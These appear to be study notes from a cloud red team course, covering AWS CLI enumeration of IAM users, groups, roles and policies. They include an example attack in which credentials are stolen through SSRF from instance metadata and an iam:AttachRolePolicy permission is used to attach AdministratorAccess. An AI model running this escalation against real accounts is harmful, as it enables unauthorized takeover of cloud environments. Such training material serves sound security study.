# MCRTA (Multi-cloud Red Team Analyst)

## Project Source
```
https://labs.cyberwarfare.live/app/mycourse/mcrta/intro
```

## Enumeration

### Users:

```bash
# Enumerate user identity
aws sts get-caller-identity --profile <NAME>

# List of the users
aws iam list-users --profile <NAME>

# List fo the IAM grops that the user belongs
aws iam list-groups-for-user --user-name <NAME> --profile <NAME>

# List all manageed policies that are attached to the specified IAM user
aws iam list-attached-user-policies --user-name <NAME> --profile <NAME>

# List the names of the inline policies embedded in the specified IAM user
aws iam list-user-policies --user-name <NAME> --profile <NAME>

```

### Groups:

```bash
# List of IAM groups
aws iam list-groups --profile <NAME>

# List of all users in a group
aws iam get-group --group-name <GROUP-NAME> --profile <NAME>

# List all manageed policies that are attached to the specified IAM group
aws iam list-attached-group-policies --group-name <NAME> --profile <NAME>

# List the names of the inline policies embedded in the specified IAM group
aws iam list-group-policies --group-name <NAME> --profile <NAME>
```

### Roles:

```bash
# List of IAM roles:
aws iam list-roles --profile <NAME>

# List all manageed policies that are attached to the specified IAM group
aws iam list-attached-role-policies --role-name <NAME> --profile <NAME>

# List the names of the inline policies embedded in the specified IAM group
aws iam list-role-policies --role-name <NAME> --profile <NAME>
```

### Policies:

```bash
# List of all IAM policies:
aws iam list-policies --profile <NAME>

# Retrieves information about the specified managed policy:
aws iam get-policy --policy-arn <policy-arn> --profile <NAME>

# Lists information about the versions fo the specified manages policy:
aws iam list-policy-verions --policy-arn <policy-arn> --profile <NAME>

# Retrieves information about the specified version of the specified managed policy:
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id> --profile <NAME>

# Retrieves the specified inline polcy document that is embedded on the speciied IAM user / group / role:
aws iam get-user-policy --user-name <user-name> --policy-name <policy-name> --profile <NAME>
aws iam get-group-policy --group-name <group-name> --policy-name <policy-name> --profile <NAME>
aws iam get-role-policy --role-name <role-name> --policy-name <policy-name> --profile <NAME>
```

## Cloud Red Team Operation

### Cloud Red Team Attack Life Cycle
- Recon
- Initial Compromise
- Establish Persistence
- Escalate Privileges 
    - Internal Enumeration
    - Credential Access
    - Lateral Movement
- Data Exfiltration
- Impact
- Complete Operations

### Example Scenario
Let's say that the Red Team operator is given with a low-privileged and readOnly access account to begin with... 

```bash
# Configure the Key and Secret
aws configure --profile <NAME>

# Get the identity of the given user
aws sts get-caller-identity --profile <NAME>

# Enumerate cloud services
aws ec2 describe-instances --profile <NAME>
```

The EC2 was running with an application which was vulnerable to SSRF. This led the operator to further gain access to the credentials from the meta-data access...

```bash
# Configure the credentials
aws configure set aws_access_key_id <key-id> --profile <NAME>
aws configure set aws_secret_access_key <key-id> --profile <NAME>
aws configure set aws_session_token <tokne> --profile <NAME>
aws sts get-caller-identify --profile <NAME>

# Get the managed policy attached to EC2 instance
aws iam list-attached-role-policies --role-name <role-name> --profile <NAME>

# Retrieves the specified inline policy document that is embedded on the EC2 instance role
aws iam list-role-policies --role-name <role-name> --profile <NAME>

# Get the permissions in inline policy
aws iam get-role-policy --role-name <role-name> --policy-name <policy-name> --profile <NAME>
```

The inline policy was configured with `iam:AttachRolePolicy` which is dangerous since you can attach any policy into your role(s)

```bash
# Escalate the priviliege by attaching administrator policy 
aws iam attach-role-policy --policy-arn arn:aws:iam;:aws:policy/AdministratorAccess --role-name <role-name> --profile <NAME>
```